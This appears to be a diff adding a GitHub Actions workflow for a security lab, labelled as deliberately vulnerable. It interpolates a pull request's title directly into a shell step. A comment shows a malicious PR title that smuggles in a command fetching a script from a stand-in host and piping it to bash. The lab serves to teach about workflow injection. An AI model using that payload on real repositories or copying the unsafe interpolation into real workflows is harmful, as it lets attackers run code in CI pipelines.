@@ -1,0 +1,18 @@
+# Lab 4 — ❌ VULNERABLE ON PURPOSE. Do not copy into a real repo.
+# Anyone can open a PR with the title:   x"; curl -s https://evil.example/x.sh | bash; echo "
+# and GitHub pastes it straight into the script before bash runs it.
+name: injection-bad
+
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Greet the PR (VULNERABLE)
+        run: |
+          echo "Thanks for: ${{ github.event.pull_request.title }}"
